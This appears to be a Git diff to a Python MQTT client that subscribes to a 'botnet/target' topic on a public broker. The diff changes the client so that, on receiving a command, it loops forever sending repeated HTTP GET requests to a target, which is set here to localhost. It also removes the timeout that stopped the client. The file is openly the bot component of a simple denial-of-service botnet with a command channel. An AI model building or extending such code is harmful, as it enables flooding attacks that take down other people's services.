@@ -1,5 +1,6 @@
 import paho.mqtt.client as mqtt
 import time
+import requests
 broker = "iot.eclipse.org"
 port = 1883
 global received
@@ -12,21 +13,38 @@ def on_connect(client, userdata, flags, rc):
     # reconnect then subscriptions will be renewed.
     #client.subscribe("$SYS/#")
     client.subscribe("botnet/target")
-    client.subscribe("botnet/heartbeatId")
+    #client.subscribe("botnet/heartbeatId")
 
 # The callback for when a PUBLISH message is received from the server.
 def on_message(client, userdata, msg):
     print(msg.topic+" "+str(msg.payload))
     print(" ")
+    target="http://localhost"
     global received
     received=1
-    client.loop_stop()
+    while(received==1):
+        #get
+        print("get")
+        print(target)
+        r = requests.get(target)
+
+        print(r.text)
+        r = requests.get(target)
+        print(r.text)
+        r = requests.get(target)
+        print(r.text)
+        r = requests.get(target)
+        print(r.text)
+        r = requests.get(target)
+        print(r.text)
+        time.sleep(1)
     
 
 client = mqtt.Client()
 client.on_connect = on_connect
 client.on_message = on_message
 client.connect(broker,port)
+client.loop_forever()
 
 # Blocking call that processes network traffic, dispatches callbacks and
 # handles reconnecting.
@@ -35,16 +53,3 @@ client.connect(broker,port)
 
 #Runs until it receives a message
 
-
-startTime=time.time()
-while(True):
-    client.loop(.1)
-    if(int((time.time()-startTime)%60%14)==0):
-        time.sleep(1)## 15 seconds elapsed
-        print("15 seconds elapsed")
-        if(received==0):
-            print("Vemos, no hay nadie vivo")
-            client.loop_stop()
-            break
-        else:
-            received=0
